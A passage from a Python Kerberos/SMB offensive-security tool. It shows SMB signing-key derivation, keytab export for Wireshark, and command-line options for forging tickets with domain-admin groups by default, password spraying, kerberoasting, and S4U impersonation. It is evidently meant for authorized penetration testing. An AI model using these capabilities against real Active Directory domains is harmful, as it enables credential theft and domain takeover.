			CliKEnc = SMB3KDF (binascii.unhexlify (hexClientServiceSessionKey), b"SMB2AESCCM\x00", b"ServerIn\x00")
			ServerKDec = CliKEnc
			CliKDec = SMB3KDF (binascii.unhexlify (hexClientServiceSessionKey), b"SMB2AESCCM\x00", b"ServerOut\x00")
			ServerKEnc = CliKDec
			print ("\t" * indent + "[+] Signing Key = {}".format (KSign))
			print ("\t" * indent + "[+] Application Key = {}".format (KApp))
			print ("\t" * indent + "[+] Client Encryption Key = Server Decryption Key = {}".format (CliKEnc, ServerKDec))
			print ("\t" * indent + "[+] Client Decryption Key = Server Encryption Key = {}".format (CliKDec, ServerKEnc))
			return KSign
		elif (dialectSMB == "3.1.1"):
			if (hexPrevSMBPackets != ""):
				PrevMessages = hexPrevSMBPackets.split(":")
				preAuthIntegrityHash = ComputePreAuthIntegrityHash (PrevMessages)
				KSign = SMB3KDF (binascii.unhexlify (hexClientServiceSessionKey), b"SMBSigningKey\x00", binascii.unhexlify (preAuthIntegrityHash))
				KApp = SMB3KDF (binascii.unhexlify (hexClientServiceSessionKey), b"SMBAppKey\x00", binascii.unhexlify (preAuthIntegrityHash))
				CliKEnc = SMB3KDF (binascii.unhexlify (hexClientServiceSessionKey), b"SMBC2SCipherKey\x00", binascii.unhexlify (preAuthIntegrityHash))
				ServerKDec = CliKEnc
				CliKDec = SMB3KDF (binascii.unhexlify (hexClientServiceSessionKey), b"SMBS2CCipherKey\x00", binascii.unhexlify (preAuthIntegrityHash))
				ServerKEnc = CliKDec
				print ("\t" * indent + "[+] Signing Key = {}".format (KSign))
				print ("\t" * indent + "[+] Application Key = {}".format (KApp))
				print ("\t" * indent + "[+] Client Encryption Key = Server Decryption Key = {}".format (CliKEnc, ServerKDec))
				print ("\t" * indent + "[+] Client Decryption Key = Server Encryption Key = {}".format (CliKDec, ServerKEnc))
				return KSign
			else:
				print ("\t" * indent + "[-] Previous SMB messages required for SMB Dialect 3.1.1 in the form <SMBHeader+NegotiateProtocolRequest>:<SMBHeader+NegotiateProtocolResponse>:<SMBHeader+SessionSetupRequest>:<SMBHeader+SessionSetupResponse>:<SMBHeader+SessionSetupRequest>", file = sys.stderr)
				return ''
		else:
			print ("\t" * indent + "[-] Unsupported SMB Dialect", file = sys.stderr)
			return ''
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def signPacketSMB(hexClientServiceSessionKey, dialectSMB, hexSMBPacket, hexPrevSMBPackets = ""):
	print_yellow("[*] Signing SMB packet")
	print_yellow("---")
	print()

	try:
		if dialectSMB == None or hexClientServiceSessionKey == None:
			print("[-] SMB Dialect and Client-to-Service Session Key required", file = sys.stderr)
			return

		print("[+] Derive MasterKey2")
		hexSigningKey = deriveKeySMB(hexClientServiceSessionKey, dialectSMB, hexPrevSMBPackets, indent = 1)
		if hexSigningKey == '':
			return

		print("[+] Computing signature")
		if (dialectSMB == "2.0.2" or dialectSMB == "2.1"):
			Signature = hmac.new (binascii.unhexlify (hexSigningKey), binascii.unhexlify (hexSMBPacket), "sha256").hexdigest()[:32]
		elif (dialectSMB == "3.0" or dialectSMB == "3.0.2" or dialectSMB == "3.1.1"):
			Signature = CMAC.new (binascii.unhexlify (hexSigningKey), binascii.unhexlify (hexSMBPacket), ciphermod = AES).hexdigest()
		else:
			print("\t[-] Unsupported SMB Dialect", file = sys.stderr)
			return
		print ("\t[+] Signature = {}".format (Signature))
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

#################
### Wireshark ###
#################

# From https://github.com/dirkjanm/forest-trust-tools/blob/master/keytab.py

# Keytab structure from http://www.ioplex.com/utilities/keytab.txt
  # keytab {
  #     uint16_t file_format_version;                    /* 0x502 */
  #     keytab_entry entries[*];
  # };

  # keytab_entry {
  #     int32_t size;
  #     uint16_t num_components;    /* sub 1 if version 0x501 */
  #     counted_octet_string realm;
  #     counted_octet_string components[num_components];
  #     uint32_t name_type;   /* not present if version 0x501 */
  #     uint32_t timestamp;
  #     uint8_t vno8;
  #     keyblock key;
  #     uint32_t vno; /* only present if >= 4 bytes left in entry */
  # };

  # counted_octet_string {
  #     uint16_t length;
  #     uint8_t data[length];
  # };

  # keyblock {
  #     uint16_t type;
  #     counted_octet_string;
  # };

class KeyTab(Structure):
    structure = (
        ('file_format_version','H=517'),
        ('keytab_entry', ':')
    )
    def fromString(self, data):
        self.entries = []
        Structure.fromString(self, data)
        data = self['keytab_entry']
        while len(data) != 0:
            ktentry = KeyTabEntry(data)

            data = data[len(ktentry.getData()):]
            self.entries.append(ktentry)

    def getData(self):
        self['keytab_entry'] = b''.join([entry.getData() for entry in self.entries])
        data = Structure.getData(self)
        return data

class OctetString(Structure):
    structure = (
        ('len', '>H-value'),
        ('value', ':')
    )

class KeyTabContentRest(Structure):
    structure = (
        ('name_type', '>I=1'),
        ('timestamp', '>I=0'),
        ('vno8', 'B=2'),
        ('keytype', '>H'),
        ('keylen', '>H-key'),
        ('key', ':')
    )

class KeyTabContent(Structure):
    structure = (
        ('num_components', '>h'),
        ('realmlen', '>h-realm'),
        ('realm', ':'),
        ('components', ':'),
        ('restdata',':')
    )

    def fromString(self, data):
        self.components = []
        Structure.fromString(self, data)
        data = self['components']
        for i in range(self['num_components']):
            ktentry = OctetString(data)

            data = data[ktentry['len']+2:]
            self.components.append(ktentry)
        self.restfields = KeyTabContentRest(data)

    def getData(self):
        self['num_components'] = len(self.components)
        # We modify the data field to be able to use the
        # parent class parsing
        self['components'] = b''.join([component.getData() for component in self.components])
        self['restdata'] = self.restfields.getData()
        data = Structure.getData(self)
        return data

class KeyTabEntry(Structure):
    structure = (
        ('size','>I-content'),
        ('content',':', KeyTabContent)
    )

def keysToWireshark(input):
	try:
		outFile = input.split(':')[0]
		keysPair = input.split(':')[1:]

		if outFile == '' or keysPair == []:
			print("[-] Kerberos Keys and outfile name required", file = sys.stderr)
			return
		
		keysPair = [(int(x.split(',')[0].strip('(').strip(' ')), x.split(',')[1].strip(')').strip(' ')) for x in keysPair]

		nkt = KeyTab()
		nkt.entries = []

		for key in keysPair:
			ktcr = KeyTabContentRest()
			ktcr['keytype'] = key[0]
			ktcr['key'] = binascii.unhexlify(key[1])
			nktcontent = KeyTabContent()
			nktcontent.restfields = ktcr
			# The realm here doesn't matter for wireshark but does of course for a real keytab
			nktcontent['realm'] = b'TESTSEGMENT.LOCAL'
			krbtgt = OctetString()
			krbtgt['value'] = 'krbtgt'
			nktcontent.components = [krbtgt]
			nktentry = KeyTabEntry()
			nktentry['content'] = nktcontent
			nkt.entries.append(nktentry)

		data = nkt.getData()
		with open(outFile, 'wb') as f:
			f.write(data)
		
		print(f"[+] Keys wrote to '{outFile}'")
		print(f"[+] Add It into Wireshark Edit -> Preferences -> KRB5 and select 'Try to decrypt Kerberos blobs'")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

##################################################
#                     MAIN                       #
##################################################

def print_red(text):
	print("\033[91m" + text + "\033[0m")

def print_yellow(text):
	print("\033[93m" + text + "\033[0m")

def parseTarget(target):
	import ipaddress, re

	cidrRegex = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]{1,2}$|^(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}/[0-9]{1,3}$"
	isFile = False
	isMultipleIPs = False

	res = []

	tmp = []
	try:
		with open(target, "r") as f:
			tmp = [line.rstrip('\n') for line in f.readlines()]
			isFile = True
	except:
		pass

	if not isFile:
		if target.find(",") != -1:
			tmp = target.split(",")
			isMultipleIPs = True

	if not isFile and not isMultipleIPs:
		tmp = [target]

	for entry in tmp:
		if re.match(cidrRegex, entry):
			network = ipaddress.ip_network(entry, strict = False)
			for ip in network:
				res.append(str(ip))
		else:
			res.append(entry)
	
	return res

def maybeSleep(deep = True, inAction = False):
	global THROTTLE, THROTTLE_DEEP
	if deep:
		if THROTTLE_DEEP != None:
			print("\n--- SLEEPING ---\n")
			time.sleep(THROTTLE_DEEP)
	else:
		if THROTTLE != None and THROTTLE_DEEP == None:
			print("--- SLEEPING ---\n")
			time.sleep(THROTTLE)
	if inAction and THROTTLE_DEEP == None:
		print()

def add_arguments(parser):
	general_group = parser.add_argument_group('[[ General ]]')
	general_group.add_argument("--encryptionType", help = "23 = eTYPE-ARCFOUR-HMAC-MD5 / 18 = eTYPE-AES256-CTS-HMAC-SHA1-96 / 17 = eTYPE-AES128-CTS-HMAC-SHA1-96", choices = [17, 18, 23], type = int)
	general_group.add_argument("--hexKrbtgtSecretKey", help = "Hex Krbtgt Secret Key")
	general_group.add_argument("--hexUserSecretKey", help = "Hex User Secret Key")
	general_group.add_argument("--hexASRepEncKey", help = "Hex AS-Rep Encryption Key")
	general_group.add_argument("--hexClientTGSSessionKey", help = "Hex Client-to-TGS Session Key")
	general_group.add_argument("--hexServiceSecretKey", help = "Hex Service Secret Key")
	general_group.add_argument("--hexClientServiceSessionKey", help = "Hex Client-to-Service Session Key")
	general_group.add_argument("--hexCredFileKeys1", help = "Hex Krbtgt Secret Key/Service Secret Key/Client-to-TGS Session Key commas separated list")
	general_group.add_argument("--hexCredFileKeys2", help = "Hex AS-Rep Encryption Key commas separated list")
	general_group.add_argument("--dialectSMB", help = "SMB Dialect for SMB Signing", choices = ["2.0.2", "2.1", "3.0", "3.0.2", "3.1.1"])
	general_group.add_argument("--hexPrevSMBPackets", help = "Previous SMB messages for SMB Dialect 3.1.1 in the form <HexSMBHeader+NegotiateProtocolRequest>:<HexSMBHeader+NegotiateProtocolResponse>:<HexSMBHeader+SessionSetupRequest>:<HexSMBHeader+SessionSetupResponse>:<HexSMBHeader+SessionSetupRequest>")

	debug_group = parser.add_argument_group('[[ Debugging ]]')
	debug_group.add_argument("--PA_ENC_TIMESTAMP", help = "Hex PA-ENC-TIMESTAMP cipher to decrypt")
	debug_group.add_argument("--TGTEncPart", help = "Hex TGT encrypted part to decrypt")
	debug_group.add_argument("--ASRepEncPart", help = "Hex AS-Rep encrypted part to decrypt")
	debug_group.add_argument("--PA_PK_AS_REP", help = "[PKINIT] Decode PA-PK-AS-REP from <HexDHPrivKey>:<HexDHNonce>:<HexPaPKASRepValue>")
	debug_group.add_argument("--PA_TGS_REQ_Authenticator", help = "Hex PA-TGS-REQ Authenticator encrypted to decrypt")
	debug_group.add_argument("--PA_FOR_USER", help = "[S4U2SELF] Build PA-FOR-USER from <Realm>:<CnameToImpersonate>")
	debug_group.add_argument("--PA_PAC_OPTIONS", help = "[S4U2PROXY] Build PA-PAC-OPTIONS", action = "store_true")
	debug_group.add_argument("--STEncPart", help = "Hex ST encrypted part to decrypt")
	debug_group.add_argument("--TGSRepEncPart", help = "Hex TGS-Rep encrypted part to decrypt")
	debug_group.add_argument("--AP_REQ_Authenticator", help = "Hex AP-REQ Authenticator encrypted to decrypt")
	debug_group.add_argument("--deriveKeySMB", help = "[SMB Signing] Hex Client-to-Service Session Key (as MasterKey2) to derive")
	debug_group.add_argument("--signPacketSMB", help = "[SMB Signing] SMB packet <HexSMBHeader+SMBMessage> to sign. Signature field must be replaced with '0'*32")
	debug_group.add_argument("--keysToWireshark", help = "Export provided Kerberos Key(s) into file for Wireshark decryption with <OutFile>:(<EncType1>,<HexKerberosKey1>):[...]:(<EncTypeN>,<HexKerberosKeyN>)")

	kerberoskey_group = parser.add_argument_group('[[ Kerberos Key ]]')
	kerberoskey_group.add_argument("--encodePwd", help = "Hex UTF-16LE encode provided password")
	kerberoskey_group.add_argument("--computeKerberosKey", help = "Compute Kerberos Key from <AccountName>:<DomainFQDN>:<HexUTF16LEPwd>. Hex UTF-16LE encoded password useful for machine account's pwds")

	manageticket_group = parser.add_argument_group('[[ Managing Ticket ]]')
	manageticket_group.add_argument("--parseFile", help = "Path to Credential File (CCACHE/Kirbi) to parse")
	manageticket_group.add_argument("--convertFile", help = "Path to Credential File to convert (CCACHE <-> Kirbi) from <InputCredFile>:<OutputCredFile>")
	manageticket_group.add_argument("--extractCred", help = "Extract matched credential from Ticket1 to Ticket2 with <UserName>@<ServiceClass>/<ServerFQDN>@<DomainFQDN>:<Ticket1>:<Ticket2>. Ticket2 is created if it does not exist")
	manageticket_group.add_argument("--editFile", help = "Path to Credential File (CCACHE/Kirbi) to edit from <InputCredFile>:<OutputCredFile>")
	manageticket_group.add_argument("--userPrincipal", help = "New User Principal value in the form of <User>@<Domain> for input file")
	manageticket_group.add_argument("--credUserPrincipal", help = "New Credential User Principal value in the form of <User>@<Domain> for input file")
	manageticket_group.add_argument("--credServicePrincipal", help = "New Credential Service Principal value <ServiceClass>/<ServerFQDN>@<Domain> for input file")
	manageticket_group.add_argument("--credStartTime", help = "New Credential UTC Start Time value in the form of '<Day>/<Month>/<Year> <Hours>:<Minutes>:<Seconds> AM/PM' for input file")
	manageticket_group.add_argument("--credEndTime", help = "New Credential UTC End Time value in the form of '<Day>/<Month>/<Year> <Hours>:<Minutes>:<Seconds> AM/PM' for input file")
	manageticket_group.add_argument("--credRenewTill", help = "New Credential UTC Renew Till value in the form of '<Day>/<Month>/<Year> <Hours>:<Minutes>:<Seconds> AM/PM' for input file")
	manageticket_group.add_argument("--credFlags", help = "New Credential Flags value for input file")
	manageticket_group.add_argument("--ticketServicePrincipal", help = "New Ticket Service Principal value <ServiceClass>/<ServerFQDN>@<Domain> for input file")

	forgeticket_group = parser.add_argument_group('[[ Forging Ticket ]]')
	forgeticket_group.add_argument("--forgeTicket", help = "Forge a CCACHE ticket (TGT or ST if SPN provided)", action = "store_true")
	forgeticket_group.add_argument("--SPN", help = "SPN to forge in ST in the form of <ServiceClass>/<ServerFQDN>")
	forgeticket_group.add_argument("--domainSID", help = "Domain SID to forge in ticket")
	forgeticket_group.add_argument("--groupsRID", help = "Commas separated list of groups RID user will belong to. Default = [513, 512, 520, 518, 519]", default = "513,512,520,518,519")
	forgeticket_group.add_argument("--userRID", help = "User RID to forge in ticket. Default = 500", default = "500")
	forgeticket_group.add_argument("--extraSID", help = "Commas separated list of ExtraSids to be included inside PAC_LOGON_INFO. Default = None")
	forgeticket_group.add_argument("--extraPAC", help = "Populate ticket with extra PAC_UPN_DNS_INFO. Default = False", action = "store_true")
	forgeticket_group.add_argument("--oldPAC", help = "Use the old PAC structure to create ticket (exclude PAC_ATTRIBUTES_INFO and PAC_REQUESTOR). Default = False", action = "store_true")
	forgeticket_group.add_argument("--duration", help = "Amount of hours till the ticket expires. Default = 10 hours", default = str(10))
	forgeticket_group.add_argument("--renewDuration", help = "Amount of hours till the ticket renewal time expires. Default = 23 hours", default = str(23))

	authservice_group = parser.add_argument_group('[[ Authentication Service ]]')
	authservice_group.add_argument("--requestTGT", help = "Request a TGT. Print hashes if Kerberos Pre-Authentication not required", action = "store_true")
	authservice_group.add_argument("--addTGTToCCACHE", help = "Add TGT into provided existing CCACHE rather than creating new one. Default = False")
	authservice_group.add_argument("--getKDCTime", help = "Get KDC UTC time by requesting fake TGT", action = "store_true")

	bf_group = parser.add_argument_group('[[ Brute Force ]]')
	bf_group.add_argument("--doBF", help = "Perform Brute Force/Pwd Spraying with provided credentials (Usernames/Pwds/NT hashes files or single values)", action = "store_true")
	bf_group.add_argument("--passLogin", help = "Try Password = Login", action = "store_true")
	bf_group.add_argument("--noAuthenticate", help = "Do not authenticate with PA-ENC-TIMESTAMP. Allows user enumeration only without locking accounts", action = "store_true")

	tgservice_group = parser.add_argument_group('[[ Ticket Granting Service ]]')
	tgservice_group.add_argument("--requestST", help = "Request a ST to provided SPN in the form of <ServiceClass>/<ServerFQDN>")
	tgservice_group.add_argument("--addSTToCCACHE", help = "Add ST into provided existing CCACHE rather than creating new one. Default = False")
	tgservice_group.add_argument("--impersonate", help = "Use S4U to impersonate provided account")
	tgservice_group.add_argument("--self", help = "Do S4U2Self (no S4U2Proxy) through S4U", action = "store_true")
	tgservice_group.add_argument("--U2U", help = "Do User-to-User through S4U", action = "store_true")
	tgservice_group.add_argument("--noPAForUser", help = "Do not include PA-FOR-USER through S4U. ST will be populate with PAC_CREDENTIALS_INFO (LM/NT Hashes) if used PKINIT authentication", action = "store_true")
	tgservice_group.add_argument("--additionalTicket", help = "Additional ST for S4U2Proxy")
	tgservice_group.add_argument("--kerberoast", help = "Account to print hashes for ST (ie. Account that hold SPN)")

THROTTLE = None
THROTTLE_DEEP = None
def handle_arguments(args):
	targets = ['LOCAL']
	if args.target != None:    
		targets = parseTarget(args.target)
	if args.shuffle:    
		random.shuffle(targets)
	if args.throttle != None:
		global THROTTLE
		THROTTLE = args.throttle
	if args.throttleDeep != None:
		global THROTTLE_DEEP
		THROTTLE_DEEP = args.throttleDeep

	firstTarget = True

	for target in targets:
		if not firstTarget:
			maybeSleep(deep = False)
		else:
			firstTarget = False

		print_red("|---------------------------")
		print_red(f"| {target}")
		print_red("|---------------------------")
		print()

		# Debugging
		if args.PA_ENC_TIMESTAMP != None:
			decryptPAENCTIMESTAMP(args.encryptionType, args.hexUserSecretKey, args.PA_ENC_TIMESTAMP)
			print()
		if args.TGTEncPart != None:
			decryptTGTEncPart(args.encryptionType, args.hexKrbtgtSecretKey, args.TGTEncPart, args.hexASRepEncKey)
			print()
		if args.ASRepEncPart != None:
			decryptASRepEncPart(args.encryptionType, args.hexUserSecretKey, args.hexASRepEncKey, args.ASRepEncPart)
			print()
		if args.PA_PK_AS_REP != None:
			decodePAPKASREP(args.encryptionType, *args.PA_PK_AS_REP.split(":"))
			print()
		if args.PA_TGS_REQ_Authenticator != None:
			decryptPATGSREQAuthenticator(args.encryptionType, args.hexClientTGSSessionKey, args.PA_TGS_REQ_Authenticator)
			print()
		if args.PA_FOR_USER != None:
			buildPAFORUSER(args.hexClientTGSSessionKey, *args.PA_FOR_USER.split(":"))
			print()
		if args.PA_PAC_OPTIONS:
			buildPAPACOPTIONS()
			print()
		if args.STEncPart != None:
			decryptSTEncPart(args.encryptionType, args.hexServiceSecretKey, args.hexClientTGSSessionKey, args.STEncPart, args.hexASRepEncKey)
			print()
		if args.TGSRepEncPart != None:
			decryptTGSRepEncPart(args.encryptionType, args.hexClientTGSSessionKey, args.TGSRepEncPart)
			print()
		if args.AP_REQ_Authenticator != None:
			decryptAPREQAuthenticator(args.encryptionType, args.hexClientServiceSessionKey, args.AP_REQ_Authenticator)
			print()
		if args.deriveKeySMB != None:
			deriveKeySMB(args.deriveKeySMB, args.dialectSMB, args.hexPrevSMBPackets)
			print()
		if args.signPacketSMB != None:
			signPacketSMB(args.hexClientServiceSessionKey, args.dialectSMB, args.signPacketSMB, args.hexPrevSMBPackets)
			print()
		if args.keysToWireshark != None:
			keysToWireshark(args.keysToWireshark)
			print()

		# Kerberos Key
		if args.encodePwd != None:
			encodePwd(args.encodePwd)
			print()
		if args.computeKerberosKey != None:
			computeKerberosKey(*args.computeKerberosKey.split(":"))
			print()

		# Managing Ticket
		if args.parseFile != None:
			parseCredFile(args.credFile, args.hexCredFileKeys1, args.hexCredFileKeys2)
			print()
		if args.convertFile != None:
			convertCredFile(*args.convertFile.split(":"))
			print()
		if args.extractCred:
			extractCredential(*args.extractCred.split(':'))
			print()
		if args.editFile != None:
			editCredFile(*args.editFile.split(":"), args.userPrincipal, args.credUserPrincipal, args.credServicePrincipal, args.ticketServicePrincipal, args.credStartTime, args.credEndTime, args.credRenewTill, args.credFlags)
			print()
		
		# Forging Ticket
		if args.forgeTicket:
			forgeTicket(args.username, args.domain, args.domainSID, args.hexKrbtgtSecretKey, args.hexServiceSecretKey, args.hexClientTGSSessionKey, args.SPN, args.groupsRID, args.userRID, args.extraPAC, args.oldPAC, args.duration, args.renewDuration, args.extraSID)
			print()
		
		# Authentication Service
		if args.requestTGT:
			_ = requestTGT(args.target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.cert, args.certPwd, args.certPrivKey, True, True, args.addTGTToCCACHE)
			maybeSleep(inAction = True)
		if args.getKDCTime:
			getKDCTime(args.target)
			print()
		
		# Brute Force
		if args.doBF:
			doBF(args.target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.passLogin, args.noAuthenticate)
			maybeSleep(inAction = True)
		
		# Ticket Granting Service
		if args.requestST:
			_ = requestST(args.target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey, args.requestST, args.impersonate, args.additionalTicket, args.self, args.U2U, args.noPAForUser, args.kerberoast, True, args.addSTToCCACHE)
			maybeSleep(inAction = True)
		
##################################################
#                     TODO                       #
##################################################

# - Implement Kerberos set/reset password (kpasswd.py)
#	- https://github.com/fortra/impacket/blob/master/examples/changepasswd.py
# - Implement ticket renewal (https://docs.specterops.io/ghostpack/rubeus/ticket-requests-and-renewals#renew)
# - Implement Kerberos Relay